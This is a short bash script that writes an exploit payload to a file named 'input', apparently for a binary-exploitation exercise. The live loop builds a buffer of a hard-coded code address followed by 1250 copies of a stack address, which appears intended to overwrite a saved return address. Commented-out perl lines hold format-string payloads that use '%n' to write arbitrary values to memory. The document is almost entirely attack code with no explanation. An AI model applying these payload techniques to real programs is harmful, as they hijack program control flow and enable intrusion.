#!/bin/bash
#perl -e 'print "\x4c\xbb\xff\xff%1$134514865c%14$n";' > input
#perl -e 'print "\xb5\x88\x04\x08","\x6c\xba\xff\xff"x1250;' > input

#"\x0c\xcf\xff\xff%134514865c%6$n"

#0x804fef1
#0x804fefb


for i in {1..1250}
do
    str_addr="$str_addr\x6c\xba\xff\xff"
done

echo -ne "\xb5\x88\x04\x08$str_addr" > input
